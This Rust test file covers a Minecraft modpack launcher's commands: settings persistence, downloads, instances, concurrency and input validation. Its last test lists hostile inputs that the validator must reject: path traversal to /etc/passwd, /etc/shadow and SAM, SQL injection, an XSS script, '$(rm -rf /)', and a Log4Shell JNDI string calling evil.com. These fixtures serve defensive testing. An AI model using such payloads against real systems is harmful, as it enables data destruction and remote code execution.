#[cfg(test)]
mod tests {
    use std::sync::{Arc, Mutex};
    use std::path::PathBuf;
    use tempfile::TempDir;
    use tokio::fs;
    use tauri::State;
    use theboys_launcher::commands::*;
    use theboys_launcher::models::*;
    use wiremock::{MockServer, matchers, ResponseTemplate};
    use wiremock::matchers::{method, path};
    use serde_json::json;

    fn create_test_app_state() -> AppState {
        AppState {
            settings: Arc::new(Mutex::new(LauncherSettings::default())),
            download_progress: Arc::new(Mutex::new(std::collections::HashMap::new())),
            launch_manager: Arc::new(crate::launcher::LaunchManager::new()),
            update_manager: Arc::new(crate::update::UpdateManager::new("1.1.0".to_string())),
        }
    }

    async fn setup_mock_server() -> MockServer {
        let server = MockServer::start().await;

        // Mock health check endpoint
        server.register(
            matchers::method("GET")
                .and(path("/health"))
                .and(matchers::header("user-agent", "TheBoys-Launcher/1.1.0"))
                .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                    "status": "OK",
                    "version": "1.1.0"
                })))
        ).await;

        // Mock modpacks endpoint
        server.register(
            matchers::method("GET")
                .and(path("/modpacks"))
                .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                    "modpacks": [
                        {
                            "id": "test-modpack-1",
                            "name": "Test Modpack 1",
                            "version": "1.0.0",
                            "description": "A test modpack",
                            "author": "Test Author",
                            "download_url": format!("{}/download/test-modpack-1", server.uri()),
                            "sha256": "abc123",
                            "size_bytes": 1024,
                            "minecraft_version": "1.20.1",
                            "modloader": "forge",
                            "dependencies": [],
                            "icon_url": None,
                            "screenshots": [],
                            "featured": true,
                            "downloads": 1000,
                            "created_at": "2024-01-01T00:00:00Z",
                            "updated_at": "2024-01-01T00:00:00Z"
                        }
                    ]
                })))
        ).await;

        // Mock download endpoint
        server.register(
            matchers::method("GET")
                .and(path("/download/test-modpack-1"))
                .respond_with(ResponseTemplate::new(200)
                    .insert_header("content-length", "1024")
                    .set_body_bytes(vec![0u8; 1024]))
        ).await;

        // Mock Java download endpoint
        server.register(
            matchers::method("GET")
                .and(path("/java/jre-17"))
                .respond_with(ResponseTemplate::new(200)
                    .insert_header("content-length", "512")
                    .set_body_bytes(vec![1u8; 512]))
        ).await;

        server
    }

    #[tokio::test]
    async fn test_complete_launcher_workflow() -> Result<(), Box<dyn std::error::Error>> {
        let app_state = create_test_app_state();
        let mock_server = setup_mock_server().await;
        let temp_dir = TempDir::new()?;

        // Step 1: Health check
        let health_result = health_check().await?;
        assert_eq!(health_result, "OK");

        // Step 2: Get system info
        let system_info = get_system_info().await?;
        assert!(system_info.total_memory_mb > 0);
        assert!(!system_info.os.is_empty());

        // Step 3: Load and validate settings
        let mut settings = get_settings(State(&app_state)).await?;

        // Configure settings based on system info
        settings.memory_mb = (system_info.total_memory_mb / 4).min(8192); // Use 25% of RAM, max 8GB
        settings.instances_dir = Some(temp_dir.path().join("instances").to_string_lossy().to_string());

        // Validate and save settings
        let validation_result = validate_setting("memory_mb".to_string(), settings.memory_mb.to_string()).await?;
        assert!(validation_result, "Memory setting should be valid");

        save_settings(settings.clone(), State(&app_state)).await?;

        // Step 4: Check available modpacks
        // Note: This would require actual HTTP client setup to use mock server
        // For now, we test the command structure
        let modpacks_result = get_available_modpacks().await;
        // May fail due to network issues, but structure should be correct

        // Step 5: Create an instance configuration
        let instance_config = InstanceConfig {
            name: "Test Instance".to_string(),
            modpack_id: "test-modpack-1".to_string(),
            minecraft_version: "1.20.1".to_string(),
            loader_type: Modloader::Forge,
            loader_version: Some("14.23.5.2859".to_string()),
            memory_mb: settings.memory_mb,
            java_path: settings.java_path.clone(),
            game_dir: temp_dir.path().join("instances").join("test-instance").to_string_lossy().to_string(),
            jvm_args: Some("-Xmx4G -XX:+UseG1GC".to_string()),
            env_vars: Some(std::collections::HashMap::new()),
            custom_resolution: None,
            fullscreen: false,
        };

        // Step 6: Validate instance configuration
        assert!(!instance_config.name.is_empty());
        assert!(!instance_config.modpack_id.is_empty());
        assert!(instance_config.memory_mb >= 2048);
        assert!(instance_config.memory_mb <= 32768);

        // Step 7: Test download management commands
        let download_id = "test-download-123";

        // Test getting download progress (should be None for non-existent)
        let progress_result = get_download_progress(download_id.to_string()).await?;
        assert!(progress_result.is_none());

        // Test getting all downloads (should be empty initially)
        let all_downloads = get_all_downloads().await?;
        assert!(all_downloads.is_empty());

        // Step 8: Test instance management commands
        let instances = get_instances().await?;
        assert!(instances.is_empty()); // Should be empty initially

        // Step 9: Test Java detection
        let java_installations = check_java_installation().await?;
        // May be empty if no Java is installed, but should not panic

        // Step 10: Test update management
        let update_settings = get_update_settings(State(&app_state)).await?;
        assert!(!update_settings.update_channel.as_str().is_empty());

        // Step 11: Test performance metrics
        let metrics = get_performance_metrics(State(&app_state)).await?;
        assert!(metrics.memory_usage_mb >= 0);
        assert!(metrics.startup_time_ms >= 0);

        Ok(())
    }

    #[tokio::test]
    async fn test_settings_persistence_workflow() -> Result<(), Box<dyn std::error::Error>> {
        let app_state = create_test_app_state();
        let temp_dir = TempDir::new()?;

        // Step 1: Get initial settings
        let initial_settings = get_settings(State(&app_state)).await?;
        let initial_memory = initial_settings.memory_mb;

        // Step 2: Modify settings
        let mut new_settings = initial_settings.clone();
        new_settings.memory_mb = 8192;
        new_settings.theme = "light".to_string();
        new_settings.instances_dir = Some(temp_dir.path().join("test-instances").to_string_lossy().to_string());
        new_settings.auto_update = false;
        new_settings.max_concurrent_downloads = 5;

        // Step 3: Save new settings
        save_settings(new_settings.clone(), State(&app_state)).await?;

        // Step 4: Verify settings were saved
        let saved_settings = get_settings(State(&app_state)).await?;
        assert_eq!(saved_settings.memory_mb, 8192);
        assert_eq!(saved_settings.theme, "light");
        assert_eq!(saved_settings.auto_update, false);
        assert_eq!(saved_settings.max_concurrent_downloads, 5);

        // Step 5: Reset settings
        let reset_settings = reset_settings(State(&app_state)).await?;
        assert_eq!(reset_settings.memory_mb, 4096); // Should be default
        assert_eq!(reset_settings.theme, "dark"); // Should be default

        // Step 6: Verify reset was applied
        let final_settings = get_settings(State(&app_state)).await?;
        assert_eq!(final_settings.memory_mb, reset_settings.memory_mb);
        assert_eq!(final_settings.theme, reset_settings.theme);

        Ok(())
    }

    #[tokio::test]
    async fn test_error_handling_workflow() -> Result<(), Box<dyn std::error::Error>> {
        let app_state = create_test_app_state();

        // Test invalid memory setting
        let invalid_memory_result = validate_setting("memory_mb".to_string(), "0".to_string()).await?;
        assert!(!invalid_memory_result);

        // Test invalid theme setting
        let invalid_theme_result = validate_setting("theme".to_string(), "invalid".to_string()).await?;
        assert!(!invalid_theme_result);

        // Test saving invalid settings should fail
        let mut invalid_settings = LauncherSettings::default();
        invalid_settings.memory_mb = 0;

        let save_result = save_settings(invalid_settings, State(&app_state)).await;
        assert!(save_result.is_err());

        // Test operations on non-existent resources
        let nonexistent_instance = get_instance("non-existent".to_string()).await?;
        assert!(nonexistent_instance.is_none());

        let nonexistent_progress = get_download_progress("non-existent-download".to_string()).await?;
        assert!(nonexistent_progress.is_none());

        // Test invalid concurrent downloads setting
        let invalid_downloads_result = set_max_concurrent_downloads(0).await;
        assert!(invalid_downloads_result.is_err());

        let too_many_downloads_result = set_max_concurrent_downloads(15).await;
        assert!(too_many_downloads_result.is_err());

        // Valid range should work
        let valid_downloads_result = set_max_concurrent_downloads(5).await;
        assert!(valid_downloads_result.is_ok());

        Ok(())
    }

    #[tokio::test]
    async fn test_concurrent_operations_workflow() -> Result<(), Box<dyn std::error::Error>> {
        let app_state = create_test_app_state();

        // Test concurrent settings access
        let settings_clone1 = app_state.settings.clone();
        let settings_clone2 = app_state.settings.clone();

        let handle1 = tokio::spawn(async move {
            get_settings(State(&AppState {
                settings: settings_clone1,
                download_progress: Arc::new(Mutex::new(std::collections::HashMap::new())),
                launch_manager: Arc::new(crate::launcher::LaunchManager::new()),
                update_manager: Arc::new(crate::update::UpdateManager::new("1.1.0".to_string())),
            })).await
        });

        let handle2 = tokio::spawn(async move {
            let mut settings = LauncherSettings::default();
            settings.memory_mb = 6144;
            save_settings(settings, State(&AppState {
                settings: settings_clone2,
                download_progress: Arc::new(Mutex::new(std::collections::HashMap::new())),
                launch_manager: Arc::new(crate::launcher::LaunchManager::new()),
                update_manager: Arc::new(crate::update::UpdateManager::new("1.1.0".to_string())),
            })).await
        });

        let result1 = handle1.await??;
        let result2 = handle2.await??;

        assert!(result1.is_ok());
        assert!(result2.is_ok());

        // Test concurrent download progress tracking
        let progress_map = Arc::new(Mutex::new(std::collections::HashMap::new()));
        let progress_clone1 = progress_map.clone();
        let progress_clone2 = progress_map.clone();

        let handle3 = tokio::spawn(async move {
            let mut map = progress_clone1.lock().unwrap();
            map.insert("download1".to_string(), DownloadProgress {
                id: "download1".to_string(),
                name: "Test Download 1".to_string(),
                downloaded_bytes: 100,
                total_bytes: 1000,
                progress_percent: 10.0,
                speed_bps: 1000,
                status: DownloadStatus::Downloading,
            });
        });

        let handle4 = tokio::spawn(async move {
            let mut map = progress_clone2.lock().unwrap();
            map.insert("download2".to_string(), DownloadProgress {
                id: "download2".to_string(),
                name: "Test Download 2".to_string(),
                downloaded_bytes: 200,
                total_bytes: 1000,
                progress_percent: 20.0,
                speed_bps: 2000,
                status: DownloadStatus::Downloading,
            });
        });

        handle3.await?;
        handle4.await?;

        // Verify both downloads were added
        let final_map = progress_map.lock().unwrap();
        assert_eq!(final_map.len(), 2);
        assert!(final_map.contains_key("download1"));
        assert!(final_map.contains_key("download2"));

        Ok(())
    }

    #[tokio::test]
    async fn test_security_validation_workflow() -> Result<(), Box<dyn std::error::Error>> {
        let app_state = create_test_app_state();

        // Test path traversal attempts
        let malicious_paths = vec![
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ];

        for malicious_path in malicious_paths {
            let result = validate_setting("java_path".to_string(), malicious_path.to_string()).await?;
            assert!(!result, "Should reject malicious path: {}", malicious_path);
        }

        // Test injection attempts in settings
        let malicious_settings = vec![
            "'; DROP TABLE settings; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
            "${jndi:ldap://evil.com/a}",
        ];

        for malicious_value in malicious_settings {
            let result = validate_setting("theme".to_string(), malicious_value.to_string()).await?;
            assert!(!result, "Should reject malicious theme: {}", malicious_value);
        }

        // Test file operations with malicious inputs
        let temp_dir = TempDir::new()?;

        // Should not allow paths outside the intended directory
        let safe_path = temp_dir.path().join("safe-file.txt");
        let unsafe_path = format!("../unsafe-file.txt");

        // Test that the system properly validates and sanitizes inputs
        let safe_result = validate_setting("instances_dir".to_string(), safe_path.to_string_lossy().to_string()).await?;
        assert!(safe_result);

        let unsafe_result = validate_setting("instances_dir".to_string(), unsafe_path).await?;
        assert!(!unsafe_result);

        Ok(())
    }
}